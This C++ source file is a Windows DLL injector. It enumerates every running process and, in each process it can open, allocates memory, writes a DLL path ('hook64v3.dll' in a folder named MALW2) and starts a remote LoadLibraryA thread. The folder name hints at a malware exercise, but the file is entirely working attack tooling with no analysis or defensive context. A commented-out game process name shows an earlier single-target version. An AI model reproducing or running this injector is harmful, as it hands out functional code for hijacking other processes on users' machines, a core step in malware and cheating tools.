#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <iostream>
#include <TlHelp32.h>
#include <iostream>
#include <fstream>
#include <wchar.h>
#include <strsafe.h>
#include <exception>
using namespace std;

// To ensure correct resolution of symbols, add Psapi.lib to TARGETLIBS
// and compile with -DPSAPI_VERSION=1

/*
int PrintProcessNameAndID(DWORD processID)
{
    TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
    int valueProc = 0; //si es unknow retorna 0, know 1!!!!!!!!!!!!!!

    // Get a handle to the process.

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
        PROCESS_VM_READ,
        FALSE, processID);

    // Get the process name.

    if (NULL != hProcess)
    {
        HMODULE hMod;
        DWORD cbNeeded;

        if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
            &cbNeeded))
        {
            GetModuleBaseName(hProcess, hMod, szProcessName,
                sizeof(szProcessName) / sizeof(TCHAR));
        }
    }

    // Print the process name and identifier. 

    _tprintf(TEXT("%s  (PID: %u)\n"), szProcessName, processID);

    if (wcscmp(szProcessName, TEXT("<unknown>")) == 0)
    { 
        valueProc = 0;
        printf("Unknown\n");
    }
    else
        valueProc = 1;

    // Release the handle to the process.

    CloseHandle(hProcess);
    return valueProc;
}*/

int main(void)
{
    // Get the list of process identifiers.

    DWORD aProcesses[8192], cbNeeded, cProcesses;
    unsigned int i;

    const char* dllPath = "C:\\Users\\User\\Desktop\\MALW2\\hook64v3.dll";
    //const char* procName = "csgo.exe";
    //DWORD procId = 0;

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
    {
        return 1;
    }


    // Calculate how many process identifiers were returned.

    cProcesses = cbNeeded / sizeof(DWORD);

    // Print the name and process identifier for each process (inject the dll to all possible processes).

    for (i = 0; i < cProcesses; i++)
    {
        if (aProcesses[i] != 0)
        {
            //int resultValue = PrintProcessNameAndID(aProcesses[i]);
            //_tprintf(TEXT("  (PID: %u)\n"), aProcesses[i]);

            //procId = aProcesses[i];

            /*while (!procId)
            {
                procId = GetProcId(procName);
                Sleep(30);
            }*/

            
            try{
                HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, aProcesses[i]);
            
                //HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);

                if (hProc && hProc != INVALID_HANDLE_VALUE)
                {
                    void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                    WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);

                    HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);

                    if (hThread)
                    {
                        CloseHandle(hThread);
                    }
                }

                if (hProc)
                {
                    CloseHandle(hProc);
                }
            }
            catch (exception& e) {
                cerr << e.what();
            }
        }
    }

    return 0;
}